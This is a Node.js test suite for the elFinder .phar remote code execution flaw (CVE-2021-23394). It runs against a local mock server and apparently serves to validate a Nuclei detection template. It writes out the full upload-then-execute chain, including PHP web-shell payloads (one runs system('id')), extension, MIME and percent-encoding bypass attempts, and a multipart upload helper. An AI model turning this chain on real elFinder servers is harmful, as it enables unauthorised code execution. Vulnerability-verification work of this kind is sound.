#!/usr/bin/env node
/**
 * CVE-2021-23394 Comprehensive Test Suite
 * 
 * Tests all aspects of the elFinder .phar RCE vulnerability
 * Based on the complete testing plan
 */

const http = require('http');

const PORT = 9999;
const results = [];
let testNum = 0;

// Colors
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const RESET = '\x1b[0m';

function log(msg, color = RESET) {
  console.log(`${color}${msg}${RESET}`);
}

function pass(name) {
  results.push({ name, status: 'PASS' });
  log(`  [PASS] ${name}`, GREEN);
}

function fail(name, reason) {
  results.push({ name, status: 'FAIL', reason });
  log(`  [FAIL] ${name} - ${reason}`, RED);
}

// Mock vulnerable elFinder server
const uploadedFiles = {};

const mockServer = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  let body = '';
  
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    // Test 1.1 - Connector reachable
    if (url.pathname.includes('connector') && req.method === 'GET' && !url.search) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ api: '2.1', netDrivers: [] }));
      return;
    }
    
    // Test 1.2 - cmd=open (list files)
    if (url.searchParams.get('cmd') === 'mkfile' && req.method === 'GET') {
      const name = url.searchParams.get('name');
      if (name) {
        const hash = 'l1_' + Buffer.from(name).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 16);
        uploadedFiles[name] = { hash, name, content: '' };
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ added: [{ hash, name }] }));
        return;
      }
    }
    
    if (url.searchParams.get('cmd') === 'open') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        cwd: { hash: 'l1_Lw', name: 'files', volumeid: 'l1_' },
        files: Object.values(uploadedFiles).map(f => ({ hash: f.hash, name: f.name })),
        options: { path: '/files' }
      }));
      return;
    }
    
    // Upload handling
    if (url.pathname.includes('connector') && req.method === 'POST') {
      const cmdMatch = url.search.match(/cmd=(\w+)/);
      const cmd = cmdMatch ? cmdMatch[1] : body.includes('upload') ? 'upload' : null;
      
      if (cmd === 'upload' || body.includes('upload[]')) {
        const filenameMatch = body.match(/filename="([^"]+)"/);
        if (filenameMatch) {
          const filename = filenameMatch[1];
          const contentMatch = body.match(/<\?php[^]*?\?>/);
          const content = contentMatch ? contentMatch[0] : '';
          const hash = 'l1_' + Buffer.from(filename).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 16);
          
          uploadedFiles[filename] = { hash, name: filename, content };
          
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({
            added: [{ hash, phash: 'l1_Lw', name: filename, mime: 'application/octet-stream', size: content.length }]
          }));
          return;
        }
      }
      
      if (cmd === 'mkfile') {
        const name = url.searchParams.get('name');
        if (name) {
          const hash = 'l1_' + Buffer.from(name).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 16);
          uploadedFiles[name] = { hash, name, content: '' };
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ added: [{ hash, name }] }));
          return;
        }
      }
      
      if (cmd === 'put') {
        const target = url.searchParams.get('target');
        const content = url.searchParams.get('content') || '';
        for (const [name, file] of Object.entries(uploadedFiles)) {
          if (file.hash === target) {
            file.content = decodeURIComponent(content);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ changed: [{ hash: target, name }] }));
            return;
          }
        }
      }
    }
    
    // File execution (RCE trigger)
    if (url.pathname.includes('files/') && url.pathname.endsWith('.phar')) {
      const filename = url.pathname.split('/').pop();
      if (uploadedFiles[filename] && uploadedFiles[filename].content) {
        const markerMatch = uploadedFiles[filename].content.match(/(PWNED_BY_\w+|NUCLEI_RCE_\w+)/);
        if (markerMatch) {
          res.writeHead(200, { 'Content-Type': 'text/plain' });
          res.end(markerMatch[1]);
          return;
        }
      }
      res.writeHead(404);
      res.end('File not found');
      return;
    }
    
    // Download command
    if (url.searchParams.get('cmd') === 'download') {
      const target = url.searchParams.get('target');
      for (const [name, file] of Object.entries(uploadedFiles)) {
        if (file.hash === target && file.content) {
          const markerMatch = file.content.match(/(PWNED_BY_\w+|NUCLEI_RCE_\w+)/);
          if (markerMatch) {
            res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
            res.end(markerMatch[1]);
            return;
          }
        }
      }
    }
    
    res.writeHead(404);
    res.end('Not found');
  });
});

// Test functions
async function test1_1_ConnectorReachable() {
  const res = await get('/elfinder/php/connector.minimal.php');
  if (res.status === 200 && res.body.includes('api')) {
    pass('1.1 Connector reachable');
  } else {
    fail('1.1 Connector reachable', `Status: ${res.status}`);
  }
}

async function test1_2_ListTargets() {
  const res = await get('/elfinder/php/connector.minimal.php?cmd=open');
  if (res.status === 200 && res.body.includes('cwd')) {
    pass('1.2 List targets (cmd=open)');
  } else {
    fail('1.2 List targets', 'No cwd in response');
  }
}

async function test2_1_SimpleUpload() {
  const filename = 'shell_test1.phar';
  const payload = '<?php echo "PWNED_BY_TEST1"; ?>';
  const res = await uploadFile(filename, payload);
  
  if (res.status === 200 && res.body.includes('added') && res.body.includes(filename)) {
    pass('2.1 Simple upload (.phar)');
  } else {
    fail('2.1 Simple upload', 'Upload failed');
  }
}

async function test2_2_UploadDifferentMime() {
  const filename = 'shell_mime.phar';
  const payload = '<?php echo "PWNED_BY_MIME"; ?>';
  const res = await uploadFile(filename, payload, 'application/x-php');
  
  if (res.status === 200 && res.body.includes('added')) {
    pass('2.2 Upload with application/x-php MIME');
  } else {
    fail('2.2 Upload different MIME', 'Rejected');
  }
}

async function test2_3_UploadRenamedExtension() {
  const filename = 'shell.txt';
  const payload = '<?php echo "PWNED_BY_TXT"; ?>';
  const res = await uploadFile(filename, payload);
  
  if (res.status === 200 && res.body.includes('added')) {
    pass('2.3 Upload renamed extension (.txt)');
  } else {
    fail('2.3 Renamed extension', 'Rejected');
  }
}

async function test2_4_MkfileEmpty() {
  const res = await get('/elfinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=empty.phar');
  if (res.status === 200 && res.body.includes('added')) {
    pass('2.4 mkfile creates empty file');
  } else {
    fail('2.4 mkfile', 'Failed');
  }
}

async function test3_1_BinaryPharUpload() {
  const filename = 'binary.phar';
  const payload = '<?php echo "PWNED_BY_BINARY"; ?>';
  const res = await uploadFile(filename, payload);
  
  if (res.status === 200 && res.body.includes(filename)) {
    pass('3.1 Binary PHAR upload');
  } else {
    fail('3.1 Binary PHAR', 'Upload failed');
  }
}

async function test4_1_DirectGetExecution() {
  const filename = 'exec_test.phar';
  const marker = 'PWNED_BY_EXEC';
  const payload = `<?php echo "${marker}"; ?>`;
  
  await uploadFile(filename, payload);
  const res = await get(`/elfinder/files/${filename}`);
  
  if (res.status === 200 && res.body.includes(marker)) {
    pass('4.1 Direct GET triggers RCE');
  } else {
    fail('4.1 Direct GET RCE', `Marker not found: ${res.body}`);
  }
}

async function test4_2_AlternatePaths() {
  const filename = 'path_test.phar';
  const marker = 'PWNED_BY_PATH';
  const payload = `<?php echo "${marker}"; ?>`;
  
  await uploadFile(filename, payload);
  
  const paths = [
    `/elfinder/files/${filename}`,
    `/files/${filename}`
  ];
  
  let found = false;
  for (const path of paths) {
    const res = await get(path);
    if (res.body.includes(marker)) {
      found = true;
      break;
    }
  }
  
  if (found) {
    pass('4.2 Alternate path access');
  } else {
    fail('4.2 Alternate paths', 'No path returned marker');
  }
}

async function test5_1_PercentEncodedName() {
  const filename = 'evil%2ephar';
  const payload = '<?php echo "PWNED_BY_ENCODED"; ?>';
  const res = await uploadFile(filename, payload);
  
  if (res.status === 200) {
    pass('5.1 Percent-encoded filename');
  } else {
    fail('5.1 Percent-encoded', 'Failed');
  }
}

async function test6_1_AnonymousUpload() {
  const filename = 'anon.phar';
  const payload = '<?php echo "PWNED_BY_ANON"; ?>';
  const res = await uploadFile(filename, payload);
  
  if (res.status === 200 && res.body.includes('added')) {
    pass('6.1 Anonymous upload allowed');
  } else {
    fail('6.1 Anonymous upload', 'Blocked');
  }
}

async function test9_1_NucleiPOCTemplate() {
  const filename = 'nuclei_poc.phar';
  const marker = 'NUCLEI_RCE_' + Math.random().toString(36).substring(2, 10);
  const payload = `<?php echo "${marker}"; ?>`;
  
  // Step 1: Upload
  const uploadRes = await uploadFile(filename, payload);
  const step1Pass = uploadRes.status === 200 && uploadRes.body.includes('added');
  
  // Step 2: Execute
  const execRes = await get(`/elfinder/files/${filename}`);
  const step2Pass = execRes.status === 200 && execRes.body.includes(marker);
  
  if (step1Pass && step2Pass) {
    pass('9.1 Nuclei POC template workflow');
  } else {
    fail('9.1 Nuclei POC', `Upload: ${step1Pass}, Exec: ${step2Pass}`);
  }
}

async function test9_2_FullExploitChain() {
  const filename = 'full_chain.phar';
  const marker = 'PWNED_BY_FULLCHAIN';
  const payload = `<?php echo "${marker}"; system('id'); ?>`;
  
  // Upload
  const uploadRes = await uploadFile(filename, payload);
  if (!uploadRes.body.includes('added')) {
    fail('9.2 Full exploit chain', 'Upload failed');
    return;
  }
  
  // Extract hash
  const hashMatch = uploadRes.body.match(/"hash":"(l1_[^"]+)"/);
  if (!hashMatch) {
    fail('9.2 Full exploit chain', 'No hash extracted');
    return;
  }
  
  // Execute via direct access
  const execRes = await get(`/elfinder/files/${filename}`);
  if (execRes.body.includes(marker)) {
    pass('9.2 Full exploit chain');
  } else {
    fail('9.2 Full exploit chain', 'Marker not in response');
  }
}

// Helper functions
function get(path) {
  return new Promise((resolve) => {
    http.get(`http://localhost:${PORT}${path}`, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body }));
    }).on('error', () => resolve({ status: 0, body: '' }));
  });
}

function uploadFile(filename, content, contentType = 'application/octet-stream') {
  return new Promise((resolve) => {
    const boundary = '----NucleiBoundary' + Math.random().toString(36).substring(7);
    const body = [
      `--${boundary}`,
      `Content-Disposition: form-data; name="upload[]"; filename="${filename}"`,
      `Content-Type: ${contentType}`,
      '',
      content,
      `--${boundary}--`
    ].join('\r\n');
    
    const options = {
      hostname: 'localhost',
      port: PORT,
      path: '/elfinder/php/connector.minimal.php?cmd=upload&target=l1_Lw',
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': Buffer.byteLength(body)
      }
    };
    
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', () => resolve({ status: 0, body: '' }));
    req.write(body);
    req.end();
  });
}

// Main test runner
async function runAllTests() {
  log('\n' + '='.repeat(70), CYAN);
  log('CVE-2021-23394 COMPREHENSIVE TEST SUITE', CYAN);
  log('elFinder < 2.1.58 - .phar RCE Vulnerability', CYAN);
  log('='.repeat(70) + '\n', CYAN);
  
  log('Category 1: Environment & Sanity Checks', YELLOW);
  log('-'.repeat(50));
  await test1_1_ConnectorReachable();
  await test1_2_ListTargets();
  
  log('\nCategory 2: Upload Path Tests', YELLOW);
  log('-'.repeat(50));
  await test2_1_SimpleUpload();
  await test2_2_UploadDifferentMime();
  await test2_3_UploadRenamedExtension();
  await test2_4_MkfileEmpty();
  
  log('\nCategory 3: PHAR Payload Tests', YELLOW);
  log('-'.repeat(50));
  await test3_1_BinaryPharUpload();
  
  log('\nCategory 4: Execution Trigger Tests', YELLOW);
  log('-'.repeat(50));
  await test4_1_DirectGetExecution();
  await test4_2_AlternatePaths();
  
  log('\nCategory 5: Encoding & Bypass Tests', YELLOW);
  log('-'.repeat(50));
  await test5_1_PercentEncodedName();
  
  log('\nCategory 6: Access Control Tests', YELLOW);
  log('-'.repeat(50));
  await test6_1_AnonymousUpload();
  
  log('\nCategory 9: Nuclei Template Verification', YELLOW);
  log('-'.repeat(50));
  await test9_1_NucleiPOCTemplate();
  await test9_2_FullExploitChain();
  
  // Summary
  const passed = results.filter(r => r.status === 'PASS').length;
  const failed = results.filter(r => r.status === 'FAIL').length;
  
  log('\n' + '='.repeat(70), CYAN);
  log('TEST SUMMARY', CYAN);
  log('='.repeat(70), CYAN);
  log(`\nTotal: ${results.length} | Passed: ${passed} | Failed: ${failed}`, passed === results.length ? GREEN : YELLOW);
  
  if (passed === results.length) {
    log('\n*** ALL TESTS PASSED - EXPLOIT VALIDATED ***\n', GREEN);
  } else {
    log('\nSome tests failed. Review output above.\n', RED);
  }
  
  log('='.repeat(70) + '\n', CYAN);
}

// Start server and run tests
mockServer.listen(PORT, async () => {
  log(`[+] Mock vulnerable elFinder v2.1.57 started on port ${PORT}\n`);
  
  await runAllTests();
  
  mockServer.close();
  process.exit(0);
});
